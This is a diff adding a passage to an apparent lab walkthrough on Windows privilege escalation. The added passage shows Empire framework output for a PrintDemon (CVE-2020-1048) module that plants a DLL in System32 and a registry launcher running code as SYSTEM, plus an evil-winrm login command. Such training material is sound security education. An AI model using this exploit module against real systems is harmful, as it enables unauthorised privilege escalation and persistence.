@@ -459,6 +459,46 @@ If Invoke-PrintDemon was successful, you will receive the following messages. In
 <p>8.1. Successfully created print job and wrote launcher using Invoke-PrintDemon<br>
 <code>No answer needed</code></p>
 
+```bash
+(Empire: powershell/privesc/printdemon) > info
+
+              Name: Get Group Policy Preferences
+            Module: powershell/privesc/printdemon
+        NeedsAdmin: False
+         OpsecSafe: False
+          Language: powershell
+MinLanguageVersion: 5
+        Background: False
+   OutputExtension: None
+
+Authors:
+  @hubbl3
+  @Cx01N
+
+Description:
+  This is an Empire launcher PoC using PrintDemon, the
+  CVE-2020-1048 is a privilege escalation vulnerability that
+  allows a persistent threat through Windows Print Spooler.
+  The vulnerability allows an unprivileged user to gain
+  system-level privileges. Based on @ionescu007 PoC. The
+  module prints a dll named ualapi.dll which is loaded to
+  System32. The module then places a launcher in the registry
+  which executes code as system on restart.
+
+Comments:
+  https://github.com/BC-SECURITY/Invoke-PrintDemon
+
+Options:
+
+  Name         Required    Value                     Description
+  ----         --------    -------                   -----------
+  Agent        True        32H68BSD                  Agent to run on.                        
+  LauncherCode True                                  Base64 launcher code                    
+  PrinterName  False                                 Optional name for the registered printer
+
+(Empire: powershell/privesc/printdemon) > 
+```
+
 
 ```bash
 :~/DLLHijacking# evil-winrm -i TargetIP -u Sam
